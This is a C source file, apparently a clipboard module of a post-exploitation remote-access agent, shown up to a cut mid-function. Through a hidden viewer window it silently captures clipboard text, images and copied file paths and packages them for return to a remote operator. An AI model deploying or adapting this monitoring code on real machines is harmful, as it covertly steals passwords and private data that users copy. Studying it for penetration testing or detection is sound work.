/*!
 * @file clipboard.c
 * @brief Definitions for clipboard interaction functionality.
 */
#include "extapi.h"
#include "../../common/thread.h"
#include "clipboard.h"
#include "clipboard_image.h"

/*! @brief the Limit on the size of the data we'll keep in memory. */
#define MAX_CLIPBOARD_MONITOR_MEMORY (1024 * 1024 * 40)

typedef enum _ClipboadrCaptureType
{
	CapText, CapFiles, CapImage
} ClipboardCaptureType;

typedef struct _ClipboardImage
{
	DWORD dwWidth;
	DWORD dwHeight;
	DWORD dwImageSize;
	LPBYTE lpImageContent;
} ClipboardImage;

typedef struct _ClipboardFile
{
	LPSTR lpPath;
	QWORD qwSize;
	struct _ClipboardFile* pNext;
} ClipboardFile;

typedef struct _ClipboardCapture
{
	ClipboardCaptureType captureType;
	union
	{
		LPSTR lpText;
		ClipboardImage* lpImage;
		ClipboardFile* lpFiles;
	};
	SYSTEMTIME stCaptureTime;
	DWORD dwSize;
	struct _ClipboardCapture* pNext;
} ClipboardCapture;

typedef struct _ClipboardCaptureList
{
	ClipboardCapture* pHead;
	ClipboardCapture* pTail;
	/*! @brief Lock to handle concurrent access to the clipboard capture list. */
	LOCK* pClipboardCaptureLock;
	/*! @brief Indication of how much data we have in memory. */
	DWORD dwClipboardDataSize;
} ClipboardCaptureList;

typedef struct _ClipboardState
{
#ifdef _WIN32
	/*! @brief Name to use for the window class when registering the message-only window. */
	char cbWindowClass[256];
	/*! @brief Handle to the clipboard monitor window. */
	HWND hClipboardWindow;
	/*! @brief Handle to the next window in the clipboard chain. */
	HWND hNextViewer;
	/*! @brief List of clipboard captures. */
	ClipboardCaptureList captureList;
#endif
	/*! @brief Indicates if the thread is running or not. */
	BOOL bRunning;
	/*! @brief Handle to the event that signals when the thread has actioned the caller's request. */
	EVENT* hResponseEvent;
	/*! @brief Signalled when the caller wants the thread to pause. */
	EVENT* hPauseEvent;
	/*! @brief Signalled when the caller wants the thread to resume. */
	EVENT* hResumeEvent;
	/*! @brief Capture image data that's found on the clipboard. */
	BOOL bCaptureImageData;
	/*! @brief Reference to the clipboard monitor thread. */
	THREAD* hThread;
} ClipboardState;

/*! @brief Pointer to the state for the monitor thread. */
static ClipboardState* gClipboardState = NULL;
static BOOL gClipboardInitialised = FALSE;

#ifdef _WIN32

/*! @brief GlobalAlloc function pointer type. */
typedef HGLOBAL(WINAPI * PGLOBALALLOC)(UINT uFlags, SIZE_T dwBytes);

/*! @brief GlobalFree function pointer type. */
typedef HGLOBAL(WINAPI * PGLOBALFREE)(HGLOBAL hMem);

/*! @brief GlobalLock function pointer type. */
typedef LPVOID(WINAPI * PGLOBALLOCK)(HGLOBAL hMem);

/*! @brief GlobalUnlock function pointer type. */
typedef LPVOID(WINAPI * PGLOBALUNLOCK)(HGLOBAL hMem);

/*! @brief OpenClipboard function pointer type. */
typedef BOOL(WINAPI * POPENCLIPBOARD)(HWND hWndNewOwner);

/*! @brief CloseClipboard function pointer type. */
typedef BOOL(WINAPI * PCLOSECLIPBOARD)();

/*! @brief SetClipboardData function pointer type. */
typedef HANDLE(WINAPI * PSETCLIPBOARDDATA)(UINT uFormat, HANDLE hMem);

/*! @brief SetClipboardData function pointer type. */
typedef HANDLE(WINAPI * PGETCLIPBOARDDATA)(UINT uFormat);

/*! @brief EnumClipboardFormats function pointer type. */
typedef UINT(WINAPI * PENUMCLIPBOARDFORMATS)(UINT uFormat);

/*! @brief EmptyClipboard function pointer type. */
typedef BOOL(WINAPI * PEMPTYCLIPBOARD)();

/*! @brief DragQueryFileA function pointer type. */
typedef BOOL(WINAPI * PDRAGQUERYFILEA)(HDROP hDrop, UINT iFile, LPSTR lpszFile, UINT cch);

/*! @brief CreateFileA function pointer type. */
typedef HANDLE(WINAPI * PCREATEFILEA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

/*! @brief CloseHandle function pointer type. */
typedef BOOL(WINAPI * PCLOSEHANDLE)(HANDLE hObject);

/*! @brief GetFileSizeEx function pointer type. */
typedef BOOL(WINAPI * PGETFILESIZEEX)(HANDLE hFile, PLARGE_INTEGER lpFileSize);

static PCLOSECLIPBOARD pCloseClipboard = NULL;
static PCLOSEHANDLE pCloseHandle = NULL;
static PCREATEFILEA pCreateFileA = NULL;
static PDRAGQUERYFILEA pDragQueryFileA = NULL;
static PEMPTYCLIPBOARD pEmptyClipboard = NULL;
static PENUMCLIPBOARDFORMATS pEnumClipboardFormats = NULL;
static PGETCLIPBOARDDATA pGetClipboardData = NULL;
static PGETFILESIZEEX pGetFileSizeEx = NULL;
static PGLOBALALLOC pGlobalAlloc = NULL;
static PGLOBALFREE pGlobalFree = NULL;
static PGLOBALLOCK pGlobalLock = NULL;
static PGLOBALUNLOCK pGlobalUnlock = NULL;
static POPENCLIPBOARD pOpenClipboard = NULL;
static PSETCLIPBOARDDATA pSetClipboardData = NULL;

DWORD initialise_clipboard()
{
#ifdef _WIN32
	DWORD dwResult;
	HMODULE hKernel32 = NULL;
	HMODULE hUser32 = NULL;
	HMODULE hShell32 = NULL;

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Loading user32.dll");
		if ((hUser32 = LoadLibraryA("user32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Loading kernel32.dll");
		if ((hKernel32 = LoadLibraryA("kernel32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load kernel32.dll");
		}

		if ((hShell32 = LoadLibraryA("shell32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load shell32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalLock");
		if ((pGlobalLock = (PGLOBALLOCK)GetProcAddress(hKernel32, "GlobalLock")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalLock in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalUnlock");
		if ((pGlobalUnlock = (PGLOBALUNLOCK)GetProcAddress(hKernel32, "GlobalUnlock")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalUnlock in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for OpenClipboard");
		if ((pOpenClipboard = (POPENCLIPBOARD)GetProcAddress(hUser32, "OpenClipboard")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate OpenClipboard in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for CloseClipboard");
		if ((pCloseClipboard = (PCLOSECLIPBOARD)GetProcAddress(hUser32, "CloseClipboard")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GetClipboardData");
		if ((pGetClipboardData = (PGETCLIPBOARDDATA)GetProcAddress(hUser32, "GetClipboardData")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GetClipboardData in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for EnumClipboardFormats");
		if ((pEnumClipboardFormats = (PENUMCLIPBOARDFORMATS)GetProcAddress(hUser32, "EnumClipboardFormats")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate EnumClipboardFormats in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for CreateFileA");
		if ((pCreateFileA = (PCREATEFILEA)GetProcAddress(hKernel32, "CreateFileA")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CreateFileA in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for CloseHandle");
		if ((pCloseHandle = (PCLOSEHANDLE)GetProcAddress(hKernel32, "CloseHandle")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseHandle in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GetFileSizeEx");
		if ((pGetFileSizeEx = (PGETFILESIZEEX)GetProcAddress(hKernel32, "GetFileSizeEx")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GetFileSizeEx in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for DragQueryFileA");
		if ((pDragQueryFileA = (PDRAGQUERYFILEA)GetProcAddress(hShell32, "DragQueryFileA")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in shell32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalAlloc");
		if ((pGlobalAlloc = (PGLOBALALLOC)GetProcAddress(hKernel32, "GlobalAlloc")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalAlloc in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for EmptyClipboard");
		if ((pEmptyClipboard = (PEMPTYCLIPBOARD)GetProcAddress(hUser32, "EmptyClipboard")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate EmptyClipboard in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for SetClipboardData");
		if ((pSetClipboardData = (PSETCLIPBOARDDATA)GetProcAddress(hUser32, "SetClipboardData")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate SetClipboardData in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalFree");
		if ((pGlobalFree = (PGLOBALFREE)GetProcAddress(hKernel32, "GlobalFree")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalFree in kernel32.dll");
		}

		dwResult = ERROR_SUCCESS;
		gClipboardInitialised = TRUE;
	} while (0);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

VOID destroy_clipboard_monitor_capture(ClipboardCaptureList* pCaptureList, BOOL bRemoveLock)
{
	ClipboardFile* pFile, *pNextFile;

	while (pCaptureList->pHead)
	{
		pCaptureList->pTail = pCaptureList->pHead->pNext;

		switch (pCaptureList->pHead->captureType)
		{
		case CapText:
			free(pCaptureList->pHead->lpText);
			break;
		case CapImage:
			free(pCaptureList->pHead->lpImage->lpImageContent);
			free(pCaptureList->pHead->lpImage);
			break;
		case CapFiles:
			pFile = pCaptureList->pHead->lpFiles;

			while (pFile)
			{
				pNextFile = pFile->pNext;
				free(pFile->lpPath);
				free(pFile);
				pFile = pNextFile;
			}
			break;
		}

		free(pCaptureList->pHead);

		pCaptureList->pHead = pCaptureList->pTail;
	}

	if (bRemoveLock && pCaptureList->pClipboardCaptureLock)
	{
		lock_destroy(pCaptureList->pClipboardCaptureLock);
		pCaptureList->pClipboardCaptureLock = NULL;
	}

	pCaptureList->pHead = pCaptureList->pTail = NULL;
	pCaptureList->dwClipboardDataSize = 0;
}

VOID timestamp_to_string(SYSTEMTIME* pTime, char buffer[40])
{
	dprintf("[EXTAPI CLIPBOARD] parsing timestamp %p", pTime);
	sprintf_s(buffer, 40, "%04u-%02u-%02u %02u:%02u:%02u.%04u",
		pTime->wYear, pTime->wMonth, pTime->wDay,
		pTime->wHour, pTime->wMinute, pTime->wSecond, pTime->wMilliseconds);
	dprintf("[EXTAPI CLIPBOARD] timestamp parsed");
}

VOID dump_clipboard_capture(Packet* pResponse, ClipboardCapture* pCapture, BOOL bCaptureImageData)
{
	ClipboardFile* pFile;
	Tlv entries[4];
	char timestamp[40];

	dprintf("[EXTAPI CLIPBOARD] Dumping clipboard capture");

	memset(entries, 0, sizeof(entries));
	memset(timestamp, 0, sizeof(timestamp));

	timestamp_to_string(&pCapture->stCaptureTime, timestamp);
	entries[0].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_TIMESTAMP;
	entries[0].header.length = lstrlenA(timestamp) + 1;
	entries[0].buffer = (PUCHAR)timestamp;
	dprintf("[EXTAPI CLIPBOARD] Timestamp added: %s", timestamp);

	switch (pCapture->captureType)
	{
	case CapText:
		dprintf("[EXTAPI CLIPBOARD] Dumping text %s", pCapture->lpText);
		entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT;
		entries[1].header.length = lstrlenA(pCapture->lpText) + 1;
		entries[1].buffer = (PUCHAR)pCapture->lpText;

		packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, entries, 2);
		dprintf("[EXTAPI CLIPBOARD] Text added to packet");
		break;
	case CapImage:
		dprintf("[EXTAPI CLIPBOARD] Dumping image %ux%x", pCapture->lpImage->dwWidth, pCapture->lpImage->dwHeight);
		entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMX;
		entries[1].header.length = sizeof(DWORD);
		entries[1].buffer = (PUCHAR)&pCapture->lpImage->dwWidth;

		entries[2].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMY;
		entries[2].header.length = sizeof(DWORD);
		entries[2].buffer = (PUCHAR)&pCapture->lpImage->dwHeight;

		entries[3].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DATA;
		entries[3].header.length = pCapture->lpImage->dwImageSize;
		entries[3].buffer = (PUCHAR)pCapture->lpImage->lpImageContent;

		packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG, entries, bCaptureImageData && pCapture->lpImage->lpImageContent ? 4 : 3);
		dprintf("[EXTAPI CLIPBOARD] Image added to packet");
		break;
	case CapFiles:
		pFile = pCapture->lpFiles;

		while (pFile)
		{
			dprintf("[EXTAPI CLIPBOARD] Dumping file %p", pFile);

			dprintf("[EXTAPI CLIPBOARD] Adding path %s", pFile->lpPath);
			entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME;
			entries[1].header.length = lstrlenA(pFile->lpPath) + 1;
			entries[1].buffer = (PUCHAR)pFile->lpPath;

			dprintf("[EXTAPI CLIPBOARD] Adding size %llu", htonq(pFile->qwSize));
			entries[2].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE;
			entries[2].header.length = sizeof(QWORD);
			entries[2].buffer = (PUCHAR)&pFile->qwSize;

			dprintf("[EXTAPI CLIPBOARD] Adding group");
			packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE, entries, 3);

			pFile = pFile->pNext;
			dprintf("[EXTAPI CLIPBOARD] Moving to next");
		}
		break;
	}
}

VOID dump_clipboard_capture_list(Packet* pResponse, ClipboardCaptureList* pCaptureList, BOOL bCaptureImageData, BOOL bPurge)
{
	ClipboardCapture* pCapture = NULL;

	lock_acquire(pCaptureList->pClipboardCaptureLock);
	pCapture = pCaptureList->pHead;
	while (pCapture)
	{
		dump_clipboard_capture(pResponse, pCapture, bCaptureImageData);
		pCapture = pCapture->pNext;
	}

	if (bPurge)
	{
		destroy_clipboard_monitor_capture(pCaptureList, FALSE);
	}
	lock_release(pCaptureList->pClipboardCaptureLock);
}

BOOL add_clipboard_capture(ClipboardCapture* pNewCapture, ClipboardCaptureList* pList)
{
	if (pNewCapture->dwSize + pList->dwClipboardDataSize > MAX_CLIPBOARD_MONITOR_MEMORY)
	{
		return FALSE;
	}

	lock_acquire(pList->pClipboardCaptureLock);

	pNewCapture->pNext = NULL;
	if (pList->pTail == NULL)
	{
		pList->pHead = pList->pTail = pNewCapture;
	}
	else
	{
		pList->pTail->pNext = pNewCapture;
		pList->pTail = pList->pTail->pNext = pNewCapture;
	}
	pList->dwClipboardDataSize += pNewCapture->dwSize;
	lock_release(pList->pClipboardCaptureLock);
	return TRUE;
}

DWORD capture_clipboard(BOOL bCaptureImageData, ClipboardCapture** ppCapture)
{
	DWORD dwResult;
	DWORD dwCount;
	HANDLE hSourceFile = NULL;
	PCHAR lpClipString = NULL;
	HGLOBAL hClipboardData = NULL;
	HDROP hFileDrop = NULL;
	UINT uFormat = 0;
	UINT uFileIndex = 0;
	UINT uFileCount = 0;
	CHAR lpFileName[MAX_PATH];
	LARGE_INTEGER largeInt = { 0 };
	LPBITMAPINFO lpBI = NULL;
	PUCHAR lpDIB = NULL;
	ConvertedImage image;
	ClipboardFile* pFile = NULL;
	ClipboardCapture* pCapture = (ClipboardCapture*)malloc(sizeof(ClipboardCapture));

	memset(pCapture, 0, sizeof(ClipboardCapture));

	pCapture->pNext = NULL;
	dprintf("[EXTAPI CLIPBOARD] Getting timestamp");
	GetSystemTime(&pCapture->stCaptureTime);
	do
	{
		// Try to get a lock on the clipboard
		if (!pOpenClipboard(NULL))
		{
			dwResult = GetLastError();
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to open the clipboard", dwResult);
		}

		dprintf("[EXTAPI CLIPBOARD] Clipboard locked, attempting to get data...");

		while (uFormat = pEnumClipboardFormats(uFormat))
		{
			if (uFormat == CF_TEXT)
			{
				// there's raw text on the clipboard
				if ((hClipboardData = pGetClipboardData(CF_TEXT)) != NULL
					&& (lpClipString = (PCHAR)pGlobalLock(hClipboardData)) != NULL)
				{
					dprintf("[EXTAPI CLIPBOARD] Clipboard text captured: %s", lpClipString);
					pCapture->captureType = CapText;
					dwCount = lstrlenA(lpClipString) + 1;
					pCapture->lpText = (char*)malloc(dwCount);
					memset(pCapture->lpText, 0, dwCount);
					strncpy_s(pCapture->lpText, dwCount, lpClipString, dwCount - 1);

					pGlobalUnlock(hClipboardData);
				}
			}
			else if (uFormat == CF_DIB)
			{
				dprintf("[EXTAPI CLIPBOARD] Grabbing the clipboard bitmap data");
				// an image of some kind is on the clipboard
				if ((hClipboardData = pGetClipboardData(CF_DIB)) != NULL
					&& (lpBI = (LPBITMAPINFO)pGlobalLock(hClipboardData)) != NULL)
				{
					dprintf("[EXTAPI CLIPBOARD] CF_DIB grabbed, extracting dimensions.");

					// grab the bitmap image size
					pCapture->captureType = CapImage;
					pCapture->lpImage = (ClipboardImage*)malloc(sizeof(ClipboardImage));
					memset(pCapture->lpImage, 0, sizeof(ClipboardImage));
					pCapture->lpImage->dwWidth = htonl(lpBI->bmiHeader.biWidth);
					pCapture->lpImage->dwHeight = htonl(lpBI->bmiHeader.biHeight);

					// only download the image if they want it
					dprintf("[EXTAPI CLIPBOARD] Image is %dx%d and %s be downloaded", lpBI->bmiHeader.biWidth, lpBI->bmiHeader.biHeight,
						bCaptureImageData ? "WILL" : "will NOT");

					if (bCaptureImageData)
					{
						lpDIB = ((PUCHAR)lpBI) + get_bitmapinfo_size(lpBI, TRUE);

						// TODO: add the ability to encode with multiple encoders and return the smallest image.
						if (convert_to_jpg(lpBI, lpDIB, 75, &image) == ERROR_SUCCESS)
						{
							dprintf("[EXTAPI CLIPBOARD] Clipboard bitmap captured to image: %p, Size: %u bytes", image.pImageBuffer, image.dwImageBufferSize);
							pCapture->lpImage->lpImageContent = image.pImageBuffer;
							pCapture->lpImage->dwImageSize = image.dwImageBufferSize;

							// Just leaving this in for debugging purposes later on
							//hSourceFile = CreateFileA("C:\\temp\\foo.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
							//WriteFile(hSourceFile, image.pImageBuffer, image.dwImageBufferSize, &largeInt.LowPart, NULL);
							//CloseHandle(hSourceFile);
						}
						else
						{
							dwResult = GetLastError();
							dprintf("[EXTAPI CLIPBOARD] Failed to convert clipboard image to JPG");
						}
					}

					pGlobalUnlock(hClipboardData);
				}
				else
				{
					dwResult = GetLastError();
					dprintf("[EXTAPI CLIPBOARD] Failed to get access to the CF_DIB information");
				}
			}
			else if (uFormat == CF_HDROP)
			{
				// there's one or more files on the clipboard
				dprintf("[EXTAPI CLIPBOARD] Files have been located on the clipboard");
				dprintf("[EXTAPI CLIPBOARD] Grabbing the clipboard file drop data");
				if ((hClipboardData = pGetClipboardData(CF_HDROP)) != NULL
					&& (hFileDrop = (HDROP)pGlobalLock(hClipboardData)) != NULL)
				{
					uFileCount = pDragQueryFileA(hFileDrop, (UINT)-1, NULL, 0);

					dprintf("[EXTAPI CLIPBOARD] Parsing %u file(s) on the clipboard.", uFileCount);
					pCapture->captureType = CapFiles;
					pFile = pCapture->lpFiles;

					for (uFileIndex = 0; uFileIndex < uFileCount; ++uFileIndex)
					{
						if (pFile == NULL)
						{
							dprintf("[EXTAPI CLIPBOARD] First file");
							pCapture->lpFiles = pFile = (ClipboardFile*)malloc(sizeof(ClipboardFile));
						}
						else
						{
							dprintf("[EXTAPI CLIPBOARD] Extra file");
							pFile->pNext = (ClipboardFile*)malloc(sizeof(ClipboardFile));
							pFile = pFile->pNext;
						}

						memset(pFile, 0, sizeof(ClipboardFile));

						dprintf("[EXTAPI CLIPBOARD] Attempting to get file data");
						if (pDragQueryFileA(hFileDrop, uFileIndex, lpFileName, sizeof(lpFileName)))
						{
							dprintf("[EXTAPI CLIPBOARD] Clipboard file entry: %s", lpFileName);

							dwCount = lstrlenA(lpFileName) + 1;
							pFile->lpPath = (char*)malloc(dwCount);
							memset(pFile->lpPath, 0, dwCount);
							strncpy_s(pFile->lpPath, dwCount, lpFileName, dwCount - 1);

							memset(&largeInt, 0, sizeof(largeInt));

							if ((hSourceFile = pCreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != NULL)
							{
								if (pGetFileSizeEx(hSourceFile, &largeInt))
								{
									pFile->qwSize = htonq(largeInt.QuadPart);
								}

								pCloseHandle(hSourceFile);
							}

						}
					}

					pGlobalUnlock(hClipboardData);
				}
			}
		}

		dwResult = GetLastError();
		dprintf("[EXTAPI CLIPBOARD] Finished with result %u (%x)", dwResult, dwResult);

		pCloseClipboard();
	} while (0);

	if (dwResult != ERROR_SUCCESS)
	{
		free(pCapture);
		pCapture = NULL;
	}
	*ppCapture = pCapture;

	return dwResult;
}

LRESULT WINAPI clipboard_monitor_window_proc(HWND hWnd, UINT uMsg, LPARAM lParam, WPARAM wParam)
{
	DWORD dwResult;
	ClipboardState* pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);
	ClipboardCapture* pNewCapture = NULL;

	if (!pState)
	{
		pState = gClipboardState;
	}

	switch (uMsg)
	{
	case WM_CREATE:
		dprintf("[EXTAPI CLIPBOARD] received WM_CREATE %x", hWnd);
		pState = (ClipboardState*)pState;
		SetWindowLongPtrA(hWnd, GWLP_USERDATA, (LONG_PTR)pState);
		pState->hNextViewer = SetClipboardViewer(hWnd);
		dprintf("[EXTAPI CLIPBOARD] SetClipboardViewer called, next viewer is %x", pState->hNextViewer);

		if (!pState->hNextViewer)
		{
			dprintf("[EXTAPI CLIPBOARD] SetClipboardViewer error %u", GetLastError());
		}
		break;

	case WM_CHANGECBCHAIN: 
		dprintf("[EXTAPI CLIPBOARD] received WM_CHANGECBCHAIN %x", hWnd);
		if ((HWND)wParam == pState->hNextViewer)
		{
			pState->hNextViewer = (HWND)lParam;
			dprintf("[EXTAPI CLIPBOARD] Next viewer is now %x", pState->hNextViewer);
		}
		else if (pState->hNextViewer)
		{
			SendMessageA(pState->hNextViewer, uMsg, wParam, lParam);
		}
        break;

     case WM_DRAWCLIPBOARD:
		dprintf("[EXTAPI CLIPBOARD] received WM_DRAWCLIPBOARD %x", hWnd);

		if (pState->bRunning)
		{
			dprintf("[EXTAPI CLIPBOARD] thread is running, harvesting clipboard %x", hWnd);
			dwResult = capture_clipboard(pState->bCaptureImageData, &pNewCapture);
			if (dwResult == ERROR_SUCCESS && pNewCapture != NULL)
			{
				if (add_clipboard_capture(pNewCapture, &pState->captureList))
				{
					dprintf("[EXTAPI CLIPBOARD] Capture added %x", hWnd);
				}
				else
				{
					free(pNewCapture);
					dprintf("[EXTAPI CLIPBOARD] Data size too big, ignoring data %x", hWnd);
				}
			}
			else
			{
				dprintf("[EXTAPI CLIPBOARD] Failed to harvest from clipboard %x: %u (%x)", hWnd, dwResult, dwResult);
			}
		}
		else
		{
			dprintf("[EXTAPI CLIPBOARD] thread is no running, ignoring clipboard change %x", hWnd);
		}

		if (pState->hNextViewer)
		{
			dprintf("[EXTAPI CLIPBOARD] Passing on to %x", pState->hNextViewer);
			SendMessageA(pState->hNextViewer, uMsg, wParam, lParam);
		}
        break;

	case WM_DESTROY:
		dprintf("[EXTAPI CLIPBOARD] received WM_DESTROY %x", hWnd);
		ChangeClipboardChain(hWnd, pState->hNextViewer); 
		break;

	default:
		return DefWindowProcA(hWnd, uMsg, lParam, wParam);
	}

	return (LRESULT)NULL;
}

DWORD create_clipboard_monitor_window(ClipboardState* pState)
{
	DWORD dwResult;
	BOOL bRegistered = FALSE;
	WNDCLASSEXA wndClass = { 0 };

	wndClass.cbSize = sizeof(WNDCLASSEXA);
	wndClass.lpfnWndProc = (WNDPROC)clipboard_monitor_window_proc;
	wndClass.hInstance = GetModuleHandleA(NULL);
	wndClass.lpszClassName = pState->cbWindowClass;

	dprintf("[EXTAPI CLIPBOARD] Setting up the monitor window. Class = %s from %p -> %s", wndClass.lpszClassName, pState, pState->cbWindowClass);

	do
	{
		if (!RegisterClassExA(&wndClass))
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to register window class.");
		}

		dprintf("[EXTAPI CLIPBOARD] Window registered");
		bRegistered = TRUE;

		pState->hClipboardWindow = CreateWindowExA(0, pState->cbWindowClass, pState->cbWindowClass, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, pState);

		if (pState->hClipboardWindow == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to create message only window instance");
		}

		dprintf("[EXTAPI CLIPBOARD] Window created");
		dwResult = ERROR_SUCCESS;

	} while (0);

	if (pState->hClipboardWindow == NULL && bRegistered)
	{
		UnregisterClassA(pState->cbWindowClass, GetModuleHandleA(NULL));
	}

	return dwResult;
}

DWORD destroy_clipboard_monitor_window(ClipboardState* pState)
{
	DWORD dwResult;

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Destroying clipboard monitor window: %p", pState);
		if (!DestroyWindow(pState->hClipboardWindow))
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to destroy the clipboard window");
		}

		if (!UnregisterClassA(pState->cbWindowClass, GetModuleHandleA(NULL)))
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to destroy the clipboard window");
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	return dwResult;
}

#endif
/*!
 * @brief Handle the request to get the data from the clipboard.
 * @details This function currently only supports the following clipboard data formats:
 *             - CF_TEXT  - raw text data.
 *             - CF_DIB   - bitmap/image information.
 *             - CF_HDROP - file selection.
 *
 *          Over time more formats will be supported.
 * @param remote Pointer to the remote endpoint.
 * @param packet Pointer to the request packet.
 * @return Indication of success or failure.
 * @todo Add support for more data formats.
 */
DWORD request_clipboard_get_data(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult;
	ClipboardCapture* pCapture = NULL;
	BOOL bDownload = FALSE;
	Packet *pResponse = packet_create_response(packet);

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Checking to see if we loaded OK");
		if (!gClipboardInitialised)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Clipboard failed to initialise, unable to get data");
		}

		bDownload = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_DOWNLOAD);

		if ((dwResult = capture_clipboard(bDownload, &pCapture)) != ERROR_SUCCESS)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] failed to read clipboard data");
		}

		dprintf("[EXTAPI CLIPBOARD] writing to socket");
		dump_clipboard_capture(pResponse, pCapture, bDownload);
		dprintf("[EXTAPI CLIPBOARD] written to socket");

		free(pCapture);

		dwResult = GetLastError();
	} while (0);

	if (pResponse)
	{
		dprintf("[EXTAPI CLIPBOARD] sending response");
		packet_transmit_response(dwResult, remote, pResponse);
	}

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Handle the request to set the data that's on the clipboard.
 * @details This function currently only supports the following clipboard data formats:
 *             - CF_TEXT - raw text data.
 *
 *          Over time more formats will be supported.
 * @param remote Pointer to the remote endpoint.
 * @param packet Pointer to the request packet.
 * @return Indication of success or failure.
 * @todo Add support for more data formats.
 */
DWORD request_clipboard_set_data(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult;
	PCHAR lpClipString;
	HGLOBAL hClipboardData;
	PCHAR lpLockedData;
	SIZE_T cbStringBytes;

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Checking to see if we loaded OK");
		if (!gClipboardInitialised)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Clipboard failed to initialise, unable to get data");
		}

		if ((lpClipString = packet_get_tlv_value_string(packet, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT)) == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] No string data specified", ERROR_INVALID_PARAMETER);
		}

		cbStringBytes = (SIZE_T)strlen(lpClipString) + 1;

		// do the "use the right kind of memory once locked" clip board data dance.
		// Note that we don't free up the memory we've allocated with GlobalAlloc
		// because the windows clipboard magic does it for us.
		if ((hClipboardData = pGlobalAlloc(GMEM_MOVEABLE | GMEM_DDESHARE, cbStringBytes)) == NULL)
		{
			dwResult = GetLastError();
			pCloseClipboard();
